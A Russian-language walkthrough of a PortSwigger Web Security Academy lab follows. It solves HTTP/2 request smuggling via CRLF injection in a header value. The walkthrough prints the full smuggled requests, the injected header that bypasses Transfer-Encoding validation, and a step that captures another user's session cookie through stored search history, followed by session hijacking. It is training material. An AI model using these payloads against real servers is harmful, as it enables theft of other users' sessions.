Перейдем на уязвимый ресурс 

Изучим историю запросов в `Proxy` -> `HTTP history`

и отправим в `Repeater` запрос на корневую страницу и модифицируем его

принудительно поменяем версию протокола на HTTP2
```
POST / HTTP/2
Host: 0a0e000504fbcdd08023774700380017.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /qweqdnqifbqbqwoncqicnqw HTTP/1.1
X-ignore: x
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/1.png)

И сколько бы мы не отправляли этот запрос, и последующие на корневую страницу -  все равно 200 статус респонс код

Вполне возможно, хэдер `Transfer-encoding : chunked` не проходит валидацию на сервисе
Попробуем обойти ограничение, и в `Inspector` ->` Request headers` создадим `header Foo `
со значением 
```
Bar\r\n
Transfer-encoding : chunked
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/2.png)

сохраним

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/3.png)

и тогда наш запрос преобразится в 
```
0

GET /qweqdnqifbqbqwoncqicnqw HTTP/1.1
X-ignore: x
```
и отправим любой другой запрос, и мы увидим 404 нот фаунд, что означает, что мы до сих пор можем отправлять подставные запросы

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/4.png)


так же заметим, что при поиске, сохраняются недавние результаты поисковых запросов, попробуем проэксплуатировать данную уязвимость, и передать в параметр поиска весь запрос вместе с заголовками и посмотрим, отобразятся ли они на экране
```
0

POST / HTTP/1.1
Host: 0a0e000504fbcdd08023774700380017.web-security-academy.net
Cookie: session=EzLcz1D9E3ziJa2ZZmOkgytf40zKUqVx
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=qwe
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/5.png)


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/6.png)

и пошлем легитимный запрос
```
POST / HTTP/2
```

и увидим, что гипотеза отработала и мы видим все заголовки с запрос

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/7.png)

Теперь повторим, и дождемся пока сторонний пользователь отправит запрос, чтобы подглядеть его заголовки и сессии

вновь отправим запрос
```
0

POST / HTTP/1.1
Host: 0a0e000504fbcdd08023774700380017.web-security-academy.net
Cookie: session=EzLcz1D9E3ziJa2ZZmOkgytf40zKUqVx
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=qwe
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/8.png)

и ждем 

спустя время обновим страницу и увидим, что у нас появился запрос жертвы в истории поиска откуда мы можем взять его сессионный ключ
`session=XN6j1eNSGpRPR4cAbeOG9X4g3fwxQYpN;`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/9.png)


через `Inspect` -> `Application` -> `Storage` -> `Cookies` изменим куку и получим уведомлени об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/13.%20HTTP2%20request%20smuggling%20via%20CRLF%20injection/pics%20for%20walkthrough/10.png)

